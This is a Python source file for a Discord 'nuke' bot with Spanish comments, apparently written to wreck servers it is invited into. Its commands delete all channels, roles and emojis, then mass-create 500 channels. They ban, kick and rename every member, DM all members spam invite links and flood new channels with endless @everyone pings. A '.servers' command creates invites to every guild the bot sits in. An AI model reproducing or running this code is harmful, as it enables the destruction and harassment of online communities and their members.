from email.mime import image
import discord
from discord.ext import commands


client = commands.Bot(command_prefix='.',intents=discord.Intents.all()) 
#client

###ESTE BOT FUE HECHO POR REDRUM ... y bikn.

#events

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.event
async def onready():
  print("logged in as {}".format(client.user))

@client.command()
async def cmds(ctx):
    embed = discord.Embed(
        title='Comandos De Murder',
        description='Aquí tienes la lista de comandos disponibles:',
        color=0x9305fa  # Color naranja
    )

    embed.set_author(name='Redrum.v')
    embed.add_field(name='.murder', value='eliminación y creación de canales, cambio de ícono y nombre.', inline=False)
    embed.add_field(name='.banall', value='Banea a todo el mundo', inline=False)
    embed.add_field(name='.rena', value='Renombra a todo el mundo.', inline=False)
    embed.add_field(name='.md', value='manda un MD a todos.', inline=False)
    embed.add_field(name='.emoji', value='elimina a todos los emojis del server', inline=False)
    embed.add_field(name='.roles', value='elimina todos los roles del server.', inline=False)
    embed.add_field(name='.leave', value='con esto sacass al bot del sv', inline=False)
    embed.add_field(name='.kall', value='kickea a todo el mundo (este cmd es más rapido que banall)', inline=False)
    await ctx.send(embed=embed)


#DESTRUCCIÓN DEL SV ALV


@client.command()
async def murder (ctx):
  with open('image.png', 'rb') as f: 
     icon = f.read() 
  try:
    await ctx.guild.edit(name="Colonia De Redrum") 
    await ctx.guild.edit(icon=icon)
    for channels in ctx.guild.channels:
      await channels.delete()

      print(f"deleted {channels.name}")
  except:
    print(f"cant delete {channels.name}")

  for _ in range (500):
      await ctx.guild.create_text_channel(name = "R E D")
      print("created {}".format(channels))


#pingas

@client.event
async def on_guild_channel_create(channel):
  while True:
   await channel.send(" @everyone SERVER DOMADO POR REDRUM! https mis cojones ")






###BANALL

@client.command()
async def banall(ctx):
  try:
      for members in ctx.guild.members:
        await members.ban(reason="Red estuvo aquí")
        print(f"{members} ha sido ejecutado")
  except:
        pass
  
  ###KICK ALL

@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
           pass



###### EMOJIS

@client.command()
async def emojis(ctx):
  try:
    for emoji in list(ctx.guild.emojis):
      await emoji.delete()
  except:
      pass

#### rename
  
@client.command(pass_context=True)
async def rena(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            pass
        



 ##### md


@client.command(pass_context=True)
async def md(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.send(" Únete al mejor server del mundo! https://discord.gg/4c3YDbcrwR https://discord.gg/NzqtVsg2Nu")
        except:
            pass
        print("Action completed: Message all")

#### roles
        
@client.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
       try:
          await role.delete()
          print (f"{role.name} has been deleted")
       except:
          pass

@client.command()
async def leave(ctx):
      print(f"\033[1;30m[\033[1;37m>\033[1;30m] \x1b[38;5;34mSacaron a Murder, el user fué {ctx.author} en el server {ctx.guild.name}")
      user = ctx.author
      await ctx.message.delete()
      guild=ctx.guild.id

      guild = ctx.message.guild
      await ctx.guild.leave()
      await ctx.author.send(f"Gracias por sacar al bot de {guild}")
      pass

@client.command()
async def servers(ctx):
    server_list = []
    for guild in client.guilds:
        server_info = {
            "name": guild.name,
            "members": len(guild.members),
            "id": guild.id
        }
        server_list.append(server_info)
    embed = discord.Embed(
        title=f"Lista de Servidores",
        color=discord.Color.blurple()
    )

    for info in server_list:
        invite = await generate_invite(info["id"])  
        embed.add_field(
            name=info["name"],
            value=f"Miembros: {info['members']} \nID: {info['id']}\n[Unirse al servidor]({invite.url})",
            inline=False
        )

    await ctx.send(embed=embed)

async def generate_invite(guild_id):
    guild = client.get_guild(guild_id)
    invite = await guild.text_channels[0].create_invite()
    return invite

client.run("XD")
